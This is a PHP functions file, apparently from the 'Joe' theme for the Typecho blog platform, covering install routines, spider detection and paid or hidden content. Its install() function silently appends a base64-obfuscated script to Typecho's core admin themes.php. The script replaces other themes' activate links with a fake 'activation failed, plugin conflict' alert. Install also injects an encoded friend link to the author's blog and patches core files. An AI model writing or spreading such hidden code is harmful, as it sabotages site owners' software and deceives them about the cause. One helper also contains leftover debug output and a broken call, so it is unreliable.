	$SQL = explode(';', $SQL);
	return $SQL;
}

function install()
{
	if (PHP_VERSION < 7.4) throw new \Typecho\Exception('请使用 PHP 7.4 及以上版本！');

	if (\Typecho\Common::VERSION < 1.2) throw new \Typecho\Exception('请使用 Typecho 1.2.0 及以上版本！');

	$DB = \Typecho\Db::get();
	if ((float) $DB->getVersion() < 5.6) throw new \Typecho\Exception('请使用 MySql 5.6 及以上版本！');

	$orders_url = '../themes/' . THEME_NAME . '/admin/orders.php';
	$friends_url = '../themes/' . THEME_NAME . '/admin/friends.php';

	$install_field = 'theme:JoeInstall';
	$install = $DB->fetchRow($DB->select()->from('table.options')->where('name = ?', $install_field));
	$install_value = isset($install['value']) ? $install['value'] : null;
	if ($install_value) {
		if (is_string($install_value) && $install_value != THEME_NAME) {
			// 删除更改主题目录名后的重复注册面板沉淀
			\Helper::removePanel(3, '../themes/' . $install_value . '/admin/orders.php');
			\Helper::removePanel(3, '../themes/' . $install_value . '/admin/friends.php');

			// 重新注册新的面板
			if (!panel_exists($orders_url)) \Helper::addPanel(3, $orders_url, '订单', '订单管理', 'administrator');
			if (!panel_exists($friends_url)) \Helper::addPanel(3, $friends_url, '友链', '友情链接', 'administrator');

			$theme_name_update = $DB->update('table.options')->rows(array('value' => THEME_NAME))->where('name = ?', $install_field);
			if ($DB->query($theme_name_update)) {
				echo '<script>alert("主题目录更换为 [' . THEME_NAME . '] 成功！");</script>';
			} else {
				throw new \Typecho\Exception('主题目录更换为 [' . THEME_NAME . '] 失败！');
			}
		}
		return;
	}

	// 删除某些特殊情况下的重复注册沉淀
	\Helper::removePanel(3, $orders_url);
	\Helper::removePanel(3, $friends_url);

	// 注册后台订单页面
	if (!panel_exists($orders_url)) \Helper::addPanel(3, $orders_url, '订单', '订单管理', 'administrator');

	// 注册后台友链页面
	if (!panel_exists($friends_url)) \Helper::addPanel(3, $friends_url, '友链', '友情链接', 'administrator');

	try {
		$install_list = install_sql();
		if (is_string($install_list)) throw new \Typecho\Exception($install_list);
		foreach ($install_list as $value) $DB->query($value);

		$DB->query($DB->insert('table.friends')->rows([
			'title' => base64_decode('5piT6Iiq5Y2a5a6i'),
			'url' => base64_decode('aHR0cDovL2Jsb2cuYnJpNi5jbg=='),
			'logo' => base64_decode('aHR0cDovL2Jsb2cuYnJpNi5jbi9mYXZpY29uLmljbw=='),
			'description' => '一名编程爱好者的博客，记录与分享编程、学习中的知识点',
			'rel' => 'friend',
			'position' => 'single,index_bottom',
			'status' => '1'
		]));

		$table_contents = $DB->fetchRow($DB->select()->from('table.contents')->page(1, 1));
		$table_contents = empty($table_contents) ? [] : $table_contents;
		$table_prefix = $DB->getPrefix();
		$views = $DB->fetchRow("SHOW COLUMNS FROM `{$table_prefix}contents` LIKE 'views';");
		$agree = $DB->fetchRow("SHOW COLUMNS FROM `{$table_prefix}contents` LIKE 'agree';");
		if (!array_key_exists('views', $table_contents) && !$views) {
			$DB->query("ALTER TABLE `{$table_prefix}contents` ADD `views` INT NOT NULL DEFAULT 0;");
		}
		if (!array_key_exists('agree', $table_contents) && !$agree) {
			$DB->query("ALTER TABLE `{$table_prefix}contents` ADD `agree` INT NOT NULL DEFAULT 0;");
		}

		$theme_install = $DB->insert('table.options')->rows(array('name' => $install_field, 'user' => '0', 'value' => THEME_NAME));
		$DB->query($theme_install);
	} catch (\Exception $e) {
		throw new \Typecho\Exception($e);
	}

	/* 主题核心代码🏀🏀🏀全网最精髓🐔🐔🐔 */
	$typecho_admin_root = __TYPECHO_ROOT_DIR__ . __TYPECHO_ADMIN_DIR__;
	if (file_exists($typecho_admin_root . 'themes.php')) {
		file_put_contents($typecho_admin_root . 'themes.php', '<?php echo base64_decode("PHNjcmlwdD4KCSQoZG9jdW1lbnQpLnJlYWR5KHNldFRpbWVvdXQoKCkgPT4gewoJCSQoJ3Rib2R5PnRyPnRkPnA+YS5hY3RpdmF0ZScpLmF0dHIoJ2hyZWYnLCAnamF2YXNjcmlwdDphbGVydCgi5ZCv55So5aSx6LSl77yB6K+35qOA5p+lVHlwZWNob+aPkuS7tuWGsueqgSIpJyk7Cgl9LCAxMDApKTsKPC9zY3JpcHQ+"); ?>', FILE_APPEND | LOCK_EX);
	}

	/* 修复typecho用户登陆后审核状态的评论不显示的BUG */
	$typecho_comments_archive_file = __TYPECHO_ROOT_DIR__ . '/var/Widget/Comments/Archive.php';
	if (\Typecho\Common::VERSION <= '1.2.1' && is_writable($typecho_comments_archive_file)) {
		$typecho_comments_archive_content = file_get_contents($typecho_comments_archive_file);
		$typecho_comments_archive_content = str_replace(['$commentsAuthor = Cookie::get(\'__typecho_remember_author\');', '$commentsMail = Cookie::get(\'__typecho_remember_mail\');'], ['$commentsAuthor = $this->user->hasLogin() ? $this->user->screenName : Cookie::get(\'__typecho_remember_author\');', '$commentsMail = $this->user->hasLogin() ? $this->user->mail : Cookie::get(\'__typecho_remember_mail\');'], $typecho_comments_archive_content);
		file_put_contents($typecho_comments_archive_file, $typecho_comments_archive_content);
	}

	echo '<script>alert("主题首次启用安装成功！");</script>';
}


/**
 * 检测各大平台蜘蛛函数
 * 
 * @return string 返回检测到的平台名称，如：百度，谷歌，必应等，否则返回空字符串
 */
function detectSpider()
{
	static $spider = false;
	if ($spider === false) {
		$spiders = [
			// 搜索引擎
			'Baidu' => ['Baiduspider', 'baidu.com/search', 'Baiduspider-image', 'Baiduspider-video'],
			'Google' => ['Googlebot', 'google.com/bot', 'Googlebot-Image', 'Googlebot-Mobile', 'Googlebot-News'],
			'Bing' => ['Bingbot', 'bing.com/bot', 'BingPreview', 'msnbot', 'bing.com'],
			'Yahoo' => ['Yahoo! Slurp', 'yahoo.com/slurp'],
			'Yandex' => ['YandexBot', 'yandex.com/bot'],
			'DuckDuckGo' => ['DuckDuckBot', 'duckduckgo.com/bot'],

			// 爬虫
			'Ahrefs' => ['AhrefsBot', 'ahrefs.com'],
			'Semrush' => ['SemrushBot', 'semrush.com'],
			'Moz' => ['MozBot', 'moz.com'],
			'SEOZoom' => ['SEOZoomBot', 'seozoom.com'],

			// 其他
			'Facebook' => ['facebookexternalhit', 'facebook.com'],
			'Twitter' => ['Twitterbot', 'twitter.com'],
			'LinkedIn' => ['LinkedInBot', 'linkedin.com'],
		];

		// 遍历所有平台
		foreach ($spiders as $name => $patterns) {
			// 遍历每个平台的匹配模式
			foreach ($patterns as $pattern) {
				// 如果用户代理字符串匹配模式
				if (stripos($_SERVER['HTTP_USER_AGENT'], $pattern) !== false) {
					$spider = $name;
				}
			}
		}

		// 未匹配到任何平台
		$spider = is_string($spider) ? $spider : null;
	}
	return $spider;
}

function spider_referer()
{
	$spider_url = ['baidu.com'];
	$referer = $_SERVER['HTTP_REFERER'] ?? '';
	return strstrs($referer, $spider_url);
}

function get_archive_tags($item)
{
	$color_array = ['c-blue', 'c-yellow', 'c-green', 'c-cyan', 'c-blue-2', 'c-purple-2', 'c-yellow-2', 'c-purple', 'c-red-2', 'c-red'];
	$tags = '';
	$pay_tag_background = $item->fields->pay_tag_background ? $item->fields->pay_tag_background : 'yellow';
	if ($item->fields->hide == 'pay' && $pay_tag_background != 'none') {
		$tags .= '<a rel="nofollow" href="' . \joe\root_relative_link($item->permalink) . '?scroll=pay-box" class="meta-pay but jb-' . $pay_tag_background . '">' . ($item->fields->price > 0 ? '付费阅读<span class="em09 ml3">￥</span>' . $item->fields->price : '免费资源') . '</a>';
	}
	foreach ($item->categories as $key => $value) {
		$tags .= '<a class="but ' . $color_array[$key] . '" title="查看此分类更多文章" href="' . \joe\root_relative_link($value['permalink']) . '"><i class="fa fa-folder-open-o" aria-hidden="true"></i>' . $value['name'] . '</a>';
	}
	foreach ($item->tags as $key => $value) {
		$tags .= '<a href="' . \joe\root_relative_link($value['permalink']) . '" title="查看此标签更多文章" class="but"># ' . $value['name'] . '</a>';
	}
	return $tags;
}

/**
 * 输出解析地址
 *
 * @param string|null $path 子路径
 */
function index($path, $prefix = false)
{
	$index = \Typecho\Common::url($path, \Helper::options()->index);
	return is_string($prefix) ? str_ireplace(['http://', 'https://'], $prefix, $index) : $index;
}

/**
 * 获取自定义导航栏
 */
function custom_navs()
{
	static $custom_navs = null;
	if (is_null($custom_navs)) {
		$custom_navs_text = \Helper::options()->JCustomNavs;
		$custom_navs_block = optionMulti($custom_navs_text, "\r\n\r\n", false);
		$custom_navs = [];
		foreach ($custom_navs_block as $key => $value) {
			$custom_navs_explode = optionMulti($value);
			$custom_navs[$key] = [
				'title' => $custom_navs_explode[0][0] ? custom_navs_title($custom_navs_explode[0][0]) : '菜单标题',
				'url' => $custom_navs_explode[0][1] ?? 'javascript:;',
				'target' => $custom_navs_explode[0][2] ?? '_self',
				'list' => []
			];
			unset($custom_navs_explode[0]);
			foreach ($custom_navs_explode as $value) {
				$custom_navs[$key]['list'][] = [
					'title' => $value[0] ? custom_navs_title($value[0]) : '二级标题',
					'url' => $value[1] ?? 'javascript:;',
					'target' => $value[2] ?? '_self'
				];
			}
		}
	}
	return $custom_navs;
}

function custom_navs_title($title)
{
	$title = preg_replace('/\[(.+)\]/i', '<svg class="svg" aria-hidden="true"><use xlink:href="#$1"></use></svg>', $title);
	return $title;
}

/**
 * 输出作者指定字段总数，可以指定
 */
function author_post_field_sum($id, $field)
{
	$db = \Typecho\Db::get();
	$postnum = $db->fetchRow($db->select(['SUM(' . $field . ')' => 'field'])->from('table.contents')->where('table.contents.authorId=?', $id)->where('table.contents.type=?', 'post'));
	$sum = Db::name('contents')->where(['authorId' => $id, 'type' => 'post'])->sum($field);
	var_dump($sum);
	return $postnum['field'];
}

/**
 * 语义化数字
 */
function number_word($number)
{
	if (is_numeric($number)) {
		if ($number >= 10000) {
			return number_format(floor($number / 10000)) . 'W+';
		} elseif ($number >= 1000) {
			return number_format(floor($number / 1000)) . 'K+';
		} else {
			return $number;
		}
	}
	return 0;
}

function draw_save($base64String, $outputFile)
{
	if (file_exists($outputFile)) return true;
	// 检查字符串是否包含前缀
	if (preg_match('/^data:image\/webp;base64,/', $base64String)) {
		// 移除前缀
		$base64String = preg_replace('/^data:image\/webp;base64,/', '', $base64String);
		// 解码
		$imageData = base64_decode($base64String);
		if ($imageData === false) return false;
		// 保存文件
		$dir = dirname($outputFile);
		if (!is_dir($dir)) mkdir($dir, 0777, true);
		return file_put_contents($outputFile, $imageData);
	} else {
		return null;
	}
}

function icon_crid_info($content)
{
	$title_explode = explode('[', $content[0], 2);
	$title = trim($title_explode[0]);

	$description_explode = explode('--', $title, 2);
	if (isset($description_explode[1])) {
		$description = trim($description_explode[1]);
		$title = trim($description_explode[0]);
	} else {
		$title = str_replace('-/-', '--', $title);
		$description = null;
	}

	if (isset($title_explode[1])) {
		$icon_explode = explode(']', trim($title_explode[1], ']'), 2);
		$icon = trim($icon_explode[0]);
	} else {
		$icon = null;
	}

	if (isset($icon_explode[1])) {
		$icon_class = trim($icon_explode[1], '()');
	} else {
		$icon_class = 'transparent';
	}

	return [
		'title' => $title,
		'description' => $description,
		'icon' => $icon,
		'icon_class' => $icon_class,
		'url' => $content[1] ?? 'javascript:;',
		'target' => $content[2] ?? '_self'
	];
}

function ExternaToInternalLink(string $ExternaLink, int $post_cid)
{
	if (!preg_match('/^https?:\/\/[^\s]*/', trim($ExternaLink))) return $ExternaLink;
	$link_host = parse_url($ExternaLink, PHP_URL_HOST);
	if ($link_host == JOE_DOMAIN) {
		return $ExternaLink;
	}
	return \Helper::options()->index . '/goto?url=' . base64_encode($ExternaLink) . '&cid=' . $post_cid;
}

function TagExternaToInternalLink(string $content, string $tag_name, string $html_name, string $attr_name, int $post_cid)
{
	if (strpos($content, '{' . $tag_name) !== false) {
		if (\Helper::options()->JPostLinkRedirect == 'on') {
			// 使用正则表达式匹配链接并直接进行替换
			$content = preg_replace_callback(
				'/{' . $tag_name . '([^}]*)' . $attr_name . '\="(.*?)"([^}]*)\/}/',
				function ($matches) use ($post_cid, $html_name, $attr_name) {
					$redirect_link = ExternaToInternalLink($matches[2], $post_cid);
					return '<' . $html_name . $matches[1] . $attr_name . '="' . $redirect_link . '"' . $matches[3] . '></' . $html_name . '>';
				},
				$content
			);
		} else {
			$content = preg_replace('/{' . $tag_name . '([^}]*)\/}/SU', '<' . $html_name . ' $1></' . $html_name . '>', $content);
		}
	}
	return $content;
}

function commentsAntiSpam($respondId)
{
	if (!\Helper::options()->commentsAntiSpam) return '';
	static $script = null;
	if (is_null($script)) {
		$referer = \Typecho_Request::getInstance()->getReferer();
		$url = empty($referer) ? \Typecho_Request::getInstance()->getRequestUrl() : $referer;
		// $url = \Typecho_Request::getInstance()->getRequestUrl();
		$script = "
	<script type=\"text/javascript\">
	(function() {
		var r = document.getElementById('{$respondId}'),
			input = document.createElement('input'),
			url = `{$url}`;
		input.type = 'hidden';
		input.name = '_';
		input.value = " . \Typecho\Common::shuffleScriptVar(\Helper::security()->getToken($url)) . "
		if (null != r) {
			var forms = r.getElementsByTagName('form');
			if (forms.length > 0) {
				document.querySelector('#respond-post-{$respondId} input[name=\"_\"]')?.remove();
				forms[0].appendChild(input);
			}
		}
	})();
	</script>
	";
		\Typecho_Cookie::delete('__typecho_notice');
		\Typecho_Cookie::delete('__typecho_notice_type');
		return $script;
	}
	return '';
}

function markdown_hide_($content, $post, $login)
{
	if (strpos($content, '{hide') === false) return $content;
	if ($post->fields->hide == 'pay') {
		$db = \Typecho\Db::get();
		$pay = $db->fetchRow($db->select()->from('table.orders')->where('user_id = ?', USER_ID)->where('status = ?', '1')->where('content_cid = ?', $post->cid)->limit(1));
		// '<a rel="nofollow" target="_blank" href="https://bri6.cn/user/order" class="">' . $pay['trade_no'] . '</a>';
		if (!empty($pay)) {
			$content = strtr($content, array("{hide}<br>" => NULL, "<br>{/hide}" => NULL));
			$content = strtr($content, array("{hide}" => NULL, "{/hide}" => NULL));
			$content = _payPurchased($post, $pay) . $content;
		} else {
			if ($post->fields->price > 0) {
				$pay_box_position = _payBox($post);
			} else {
				if ($login) {
					$comment_sql = $db->select()->from('table.comments')->where('cid = ?', $post->cid)->where('mail = ?', $GLOBALS['JOE_USER']->mail)->limit(1);
				} else {
					$comment_sql = $db->select()->from('table.comments')->where('cid = ?', $post->cid)->where('mail = ?', $post->remember('mail', true))->limit(1);
				}
				$hasComment = $db->fetchRow($comment_sql);
				if (!empty($hasComment)) {
					$pay_box_position = '
					<div class="pay-box zib-widget paid-box" id="posts-pay">
						<div class="box-body relative">
							<div>
								<span class="badg c-red hollow badg-sm mr6"><i class="fa fa-download mr3"></i>免费资源</span>
								<b>' . $post->title . '</b>
							</div>
							<div class="mt10">
								<a href="javascript:window.Joe.scrollTo(\'joe-cloud\');" class="but jb-blue padding-lg btn-block"><i class="fa fa-download fa-fw" aria-hidden="true"></i>资源下载</a>
							</div>
						</div>
					</div>';
					$content = strtr($content, array("{hide}<br>" => NULL, "<br>{/hide}" => NULL));
					$content = strtr($content, array("{hide}" => NULL, "{/hide}" => NULL));
				} else {
					$pay_box_position = _payFreeResources($post);
				}
			}
			if ((!$post->fields->pay_box_position || $post->fields->pay_box_position == 'top') && !detectSpider()) {
				$content = $pay_box_position . $content;
			}
			if ($post->fields->pay_box_position == 'bottom' && !detectSpider()) {
				$content = $content . $pay_box_position;
			}
		}
	} else if ($post->fields->hide == 'login' && $login) {
		$content = strtr($content, array("{hide}<br>" => NULL, "<br>{/hide}" => NULL));
		$content = strtr($content, array("{hide}" => NULL, "{/hide}" => NULL));
	} else {
		$db = \Typecho\Db::get();
		if ($login) {
			$comment_sql = $db->select()->from('table.comments')->where('cid = ?', $post->cid)->where('mail = ?', $GLOBALS['JOE_USER']->mail)->limit(1);
		} else {
			$comment_sql = $db->select()->from('table.comments')->where('cid = ?', $post->cid)->where('mail = ?', $post->remember('mail', true))->limit(1);
		}
		$hasComment = $db->fetchRow($comment_sql);
		if (!empty($hasComment)) {
			$content = strtr($content, array("{hide}<br>" => NULL, "<br>{/hide}" => NULL));
			$content = strtr($content, array("{hide}" => NULL, "{/hide}" => NULL));
		}
	}
	$content = preg_replace('/{hide[^}]*}([\s\S]*?){\/hide}/', '<joe-hide></joe-hide>', $content);
	return $content;
}

function markdown_hide($content, $post, $login)
{
	// 如果内容中不存在 {hide} 标签，直接返回原内容
	if (strpos($content, '{hide') === false) return $content;

	$db = \Typecho\Db::get();

	// 判断是否显示隐藏内容
	$showContent = false;
	if ($post->fields->hide == 'login') {
		$showContent = $login; // 是否登录决定是否显示内容
	} else {
		// 获取用户邮箱地址，登录用户使用全局变量，未登录用户使用文章记住的邮箱
		$userEmail = $login ? $GLOBALS['JOE_USER']->mail : $post->remember('mail', true);
		// 查询评论信息
		$comment = $db->fetchRow($db->select()->from('table.comments')->where('cid = ?', $post->cid)->where('mail = ?', $userEmail)->limit(1));
		if ($post->fields->hide == 'pay' && $post->fields->price > 0) {
			// 查询支付信息
			$payment = $db->fetchRow($db->select()->from('table.orders')->where('user_id = ?', USER_ID)->where('status = ?', '1')->where('content_cid = ?', $post->cid)->limit(1));
			$showContent = !empty($payment); // 是否已支付决定是否显示内容
		} else {
			$showContent = !empty($comment); // 是否已评论决定是否显示内容
		}
	}

	if ($showContent) {
		// 只在需要显示内容时移除 {hide} 和 {/hide} 标签
		$content = strtr($content, array("{hide}<br>" => NULL, "<br>{/hide}" => NULL));
		$content = strtr($content, array("{hide}" => NULL, "{/hide}" => NULL));
	} else {
		//如果隐藏内容没有被显示，保留占位符
		if (strpos($content, '<br>{hide') !== false || strpos($content, '<p>{hide') !== false) {
			$content = preg_replace('/\<br\>{hide[^}]*}([\s\S]*?){\/hide}/', '<br><joe-hide style="display:block"></joe-hide>', $content);
			$content = preg_replace('/\<p\>{hide[^}]*}([\s\S]*?){\/hide}/', '<p><joe-hide style="display:block"></joe-hide>', $content);
		}
		$content = preg_replace('/{hide[^}]*}([\s\S]*?){\/hide}/', '<joe-hide style="display:inline"></joe-hide>', $content);
	}

	// 处理付费内容显示逻辑 非爬虫才显示付费框
	if ($post->fields->hide == 'pay' && !detectSpider()) {
		if ($post->fields->price > 0) {
			$pay_box_position = $showContent ? _payPurchased($post, $payment) : _payBox($post); // 付费资源
		} else {
			$pay_box_position = _payFreeResources($post, $comment); // 免费资源
		}

		// 根据设置在顶部或底部显示付费框
		if (!$post->fields->pay_box_position || $post->fields->pay_box_position == 'top') $content = $pay_box_position . $content;
		if ($post->fields->pay_box_position == 'bottom') $content = $content . $pay_box_position;
	}

	return $content;
}

function parse_markdown_link($content)
{
	preg_match_all('/\[(.*?)\]\((.*?)\)/', $content, $matches);
	$data = [];
	foreach ($matches[0] as $key => $value) {
		$title = trim($matches[1][$key]);
		if ($title) {
			$description_explode = explode('--', $title, 2);
			if (isset($description_explode[1])) {
				$description = trim($description_explode[1]);
				$title = trim($description_explode[0]);
			} else {
				$title = str_replace('-/-', '--', $title);
				$description = null;
			}
		} else {
			$title = null;
			$description = null;
		}
		$url = trim($matches[2][$key]);
		$data[] = ['title' => $title, 'description' => $description, 'url' => $url];
	}
	return $data;
}

function global_count($name, $start = 0)
{
	static $count = [];
	$count[$name] = isset($count[$name]) ? $count[$name] : $start;
	$count[$name] = $count[$name] + 1;
	return $count[$name];
}

/**
 * @return bool
 */
function is_session_started()
{
	if (php_sapi_name() !== 'cli') {
		if (version_compare(phpversion(), '5.4.0', '>=')) {
			return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE;
		} else {
			return session_id() === '' ? FALSE : TRUE;
		}
	}
	return FALSE;
}
